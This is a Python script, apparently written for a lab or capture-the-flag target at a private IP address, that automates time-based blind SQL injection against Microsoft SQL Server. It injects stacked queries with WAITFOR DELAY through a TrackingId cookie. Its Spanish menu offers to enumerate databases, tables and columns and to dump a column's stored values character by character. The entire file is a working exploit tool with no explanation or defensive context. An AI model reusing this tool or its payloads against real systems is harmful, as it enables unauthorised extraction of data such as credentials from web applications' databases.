import requests
import sys
import threading
import json

threads = []
name_db = ''
name_tb = ''
name_column = ''
evento = threading.Event()
wordlist = "abcdefghijklmnopqrstuvwxyz0123456789{}.-_@$#/"
resultados = []

def count_rows(payload,i,n_columns):
	if evento.is_set():
		return
	headers = {"Cookie":f"TrackingId='%3b if(({payload})={i}) WAITFOR DELAY '00:00:5'%3b--"}
	respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.7:
		n_columns.append(i)
		evento.set()

def test(payload,n_columns = [],n_threads=10,threads=[]):
	try:
		for i in range(0,100):
			if evento.is_set():
				threads = []
				evento.clear()
				break
			if len(threads) >= n_threads:
				for l in threads:
					l.start()
				for l in threads:
					l.join()
				threads = []
			threads.append(threading.Thread(target=count_rows,args=(payload,i,n_columns)))
		return n_columns[0]
	except:
		sys.exit("Ejecute otra ves el script.")

def n_caracteres(payload1,i,j,resultados):
	if evento.is_set():
		return
	headers = {"Cookie":f"TrackingId='%3b if(({payload1} offset {i} rows fetch next 1 rows only)={j}) WAITFOR DELAY '00:00:05'%3b--"}
	respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.7:
		evento.set()
		resultados.append(j)

def test1(payload1,n,resultados,n_threads=10,threads=[]):
	for i in range(0,n):
		for j in range(0,100):
			if evento.is_set():
				evento.clear()
				break
			if len(threads) >= n_threads:
				for l in threads:
					l.start()
				for l in threads:
					l.join()
				threads = []
			threads.append(threading.Thread(target=n_caracteres,args=(payload1,i,j,resultados)))


def dumpear(i,j,k,chars_string,name_db,name_tb,name_column,initial_1):
	if evento.is_set():
		return
	if initial_1 == 'T':
		headers = {"Cookie":f"TrackingId='%3b if((select substring(table_name,{j},1) from information_schema.tables where table_catalog= '{name_db}' order by table_name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05'%3b--"}
		respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if initial_1 == 'B':
		headers = {"Cookie":f"TrackingId='%3b if((select substring(name,{j},1) from sys.databases order by name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05'%3b--"}
		respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if initial_1 == 'C':
		headers = {"Cookie":f"TrackingId='%3b if((select substring(column_name,{j},1) from information_schema.columns where table_name = '{name_tb}' order by column_name offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05'%3b--"}
		respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if initial_1 == 'D':
		headers = {"Cookie": f"TrackingId='%3b if((select substring({name_column},{j},1) from {name_tb} order by {name_column} offset {i} rows fetch next 1 rows only)='{k}') WAITFOR DELAY '00:00:05'%3b--"}
		respuesta = requests.get(f"http://10.129.204.202/",headers=headers)
	if respuesta.elapsed.total_seconds() > 5 and respuesta.elapsed.total_seconds() < 6.7:
		evento.set()
		chars_string.append(k)

def test2(resultados,name_db,name_tb,name_column,initial_1,n_threads=10,threads=[],chars_string=[],resultados1=[]):
	for i in range(0,len(resultados)):
		chars_string = []
		for j in range(0,resultados[i]+1):
			evento.clear()
			threads = []
			for k in wordlist:
				if len(threads) >= n_threads:
					for l in threads:
						l.start()
					for l in threads:
						l.join()
					threads = []
					if evento.is_set():
						break
				threads.append(threading.Thread(target=dumpear,args=(i,j,k,chars_string,name_db,name_tb,name_column,initial_1)))
			if threads and not evento.is_set():
				for t in threads:
					t.start()
				for t in threads:
					t.join()
		resultados1.append(''.join(chars_string))
	return resultados1

initial_1 = input('Si desea enumerar las bases de datos, digite la letra B.\n\rSi desea enumerar las tablas de una base de datos, digite la letra T.\n\rSi desea enumerar las columnas de una tabla, digite C.\n\rSi desea volcar los registros de una columna especifica, digite D.\n\rDigite su entrada: ')
if initial_1 == 'T':
	name_db = input('Digite el nombre de la base de datos: ')
	payload = f"SELECT count(table_name) FROM information_schema.tables WHERE table_catalog='{name_db}'"
	n_tablas = test(payload)
	payload1 = f"SELECT len(table_name) FROM information_schema.tables WHERE table_catalog='{name_db}' order by table_name"
	test1(payload1,n_tablas,resultados)
	resultado = ','.join(test2(resultados,name_db,name_tb,name_column,initial_1))
	if resultado == '':
		print(f"No tiene acceso a esta base de datos o no existe")
	else:
		print(f"Las tablas de la base de datos '{name_db}' son: {resultado}")
if initial_1 == 'B':
	payload = f"SELECT count(name) from sys.databases"
	n_bd = test(payload)
	payload1 = f"SELECT len(name) from sys.databases order by name"
	test1(payload1,n_bd,resultados)
	resultado = ','.join(test2(resultados,name_db,name_tb,name_column,initial_1))
	print(f"Las bases de datos son: {resultado}")
if initial_1 == 'C':
	name_tb = input('Digite el nombre de la tabla: ')
	payload = f"SELECT count(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='{name_tb}'"
	n_columnas = test(payload)
	payload1 = f"SELECT len(column_name) FROM information_schema.columns where table_name='{name_tb}' order by column_name"
	test1(payload1,n_columnas,resultados)
	resultado = ','.join(test2(resultados,name_db,name_tb,name_column,initial_1))
	if resultado == '':
		print(F"No tiene acceso a esta tabla o no existe")
	else:
		print(f"Las columnas de la tabla '{name_tb}' son: {resultado}")
if initial_1 == 'D':
	name_tb = input('Digite el nombre de la tabla: ')
	name_column = input('Digite el nombre de la columna: ')
	payload = f"SELECT count({name_column}) from {name_tb}"
	n_rows = test(payload)
	payload1 = f"SELECT len({name_column}) from {name_tb} order by {name_column}"
	test1(payload1,n_rows,resultados)
	resultado = ','.join(test2(resultados,name_db,name_tb,name_column,initial_1))
	if resultado == '':
		print(f"No tiene acceso a esta columna o no existe")
	else:
		print(f"Los valores almacenados en la columna '{name_column}' son: {resultado}")
